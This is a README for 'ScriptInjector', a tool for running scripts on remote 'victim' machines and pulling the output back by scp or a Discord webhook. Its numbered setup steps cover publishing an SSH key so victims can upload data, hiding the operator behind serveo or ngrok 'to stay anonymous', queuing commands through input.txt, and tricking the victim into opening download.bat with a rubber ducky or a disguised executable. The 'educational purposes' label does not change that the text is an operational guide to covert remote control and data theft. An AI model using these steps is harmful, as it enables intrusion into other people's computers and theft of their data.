# ScriptInjector
Inject and run scripts on remote computers and get the output back via scp or a discord webhook
For educational purposes only.

## How it works
1. Clone this repo and cd into it
    ```
    git clone https://github.com/emaa10/ScriptInjector.git
    cd ScriptInjector
    ```

2. Install packages
    ```
    sudo apt install -y apache2 openssh-client screen
    sudo systemctl enable ssh
    ```

3. Setup an apache2 webserver and put the files under `/src` into `/var/www/html/`
    ```
    sudo mv src /var/www/html
    ```

4. Generate an ssh-key to allow your victim to scp into your system, it is recommended to use another user with fewer permissions 
    ```
    ssh-keygen -t rsa
    ```
    Press enter on all questions.
    ```
    cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
    mv ~/.ssh/id_rsa ~/.ssh/id_rsa.pub /var/www/html/
    ```

5. Setup port forwarding or serveo.net/ngrok to stay anonymous
    1. forward port 80 and 22 (http and ssh)
    2. create a no-ip or a subdomain of your port-forwarding service
    3. if you're using serveo, you might need to generate a second ssh-key you don't move out of the .ssh directory and connect your gmail account

6. Create an ssh config file for your victim
    1. use the template "config" file
    2. if you're using serveo.net to forward your IP, use the "config_serveo" template
        - since serveo forwards IPs using ssh, you need to configure ProxyJump for serveo.
        - I recommend serveo because of this, it keeps your connection secure
        - You need to generate a hostname (see the launch_serveo.txt file for serveo) and just put it into "your_hostname" in your config file
    3. move your config file into /var/www/html/

7. Adapt Setup.bat and scheduled.bat to match your chosen hostname / your public IP

8. Start serveo (or a different port forwarding service)
    - See the launch_serveo.txt file for 2 commands to forward ssh and http to your_hostname.serveo.net
    - You can use screen to start multiple serveo forwarding simultaneously

9. Create folders and the input.txt
    ```
    touch /var/www/html/input.txt
    echo "dir C:\Users" >> /var/www/html/input.txt
    sudo mkdir /mnt/income
    sudo chown www-data /mnt/income
    sudo chgrp www-data /mnt/income
    sudo chmod 777 /mnt/income
    ```

10. Get the victim to open the download.bat
    - That's your part. There are many options: Using a rubberducky script or converting the bat file into an executable.